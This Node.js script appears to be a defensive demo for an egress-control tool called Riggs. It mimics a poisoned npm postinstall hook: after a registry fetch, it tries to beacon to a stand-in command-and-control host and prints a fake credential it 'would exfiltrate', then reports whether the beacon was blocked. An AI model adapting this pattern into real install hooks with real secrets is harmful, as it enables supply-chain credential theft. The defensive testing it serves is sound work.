#!/usr/bin/env node
/*
 * Benign stand-in for a poisoned pre/post-install script.
 *
 * It does exactly what real npm supply-chain malware does in shape, but nothing
 * harmful: (1) a legitimate registry fetch, then (2) an attempt to exfiltrate a
 * CLEARLY FAKE credential to a C&C stand-in host. No real secret ever leaves;
 * the payload is a literal placeholder. This runs as the `node` process, so
 * Riggs confines it to the registry — step 2 must be dropped in enforce mode.
 *
 * Env:
 *   RIGGS_DEMO_CANDC  C&C stand-in host (default: example.com)
 */
const https = require("https");

const REGISTRY = "registry.npmjs.org";
const CANDC = process.env.RIGGS_DEMO_CANDC || "example.com";
const FAKE_SECRET = "FAKE-CREDENTIAL-demo-do-not-use";

function attempt(host, label) {
  return new Promise((resolve) => {
    const req = https.request(
      { host, port: 443, path: "/", method: "GET", timeout: 4000 },
      (res) => {
        res.resume();
        console.log(`  [ ok ] ${label}: connected to ${host} (HTTP ${res.statusCode})`);
        resolve(true);
      }
    );
    req.on("timeout", () => {
      console.log(`  [BLOCKED] ${label}: connection to ${host} timed out (egress drop)`);
      req.destroy();
      resolve(false);
    });
    req.on("error", (e) => {
      console.log(`  [BLOCKED] ${label}: connection to ${host} failed (${e.code || e.message})`);
      resolve(false);
    });
    req.end();
  });
}

(async () => {
  console.log("poisoned postinstall running as node...");
  const registryOk = await attempt(REGISTRY, "registry fetch (legit)");
  console.log(`  (would exfiltrate: ${FAKE_SECRET})`);
  const beaconOk = await attempt(CANDC, "beacon to C&C");

  if (registryOk && !beaconOk) {
    console.log("\nRESULT: PASS — registry reachable, beacon blocked. Supply-chain exfil stopped.");
    process.exit(0);
  }
  if (registryOk && beaconOk) {
    console.log("\nRESULT: FAIL — beacon reached the C&C. Enforcement not active?");
    process.exit(1);
  }
  console.log("\nRESULT: INCONCLUSIVE — registry unreachable; check connectivity/policy.");
  process.exit(2);
})();
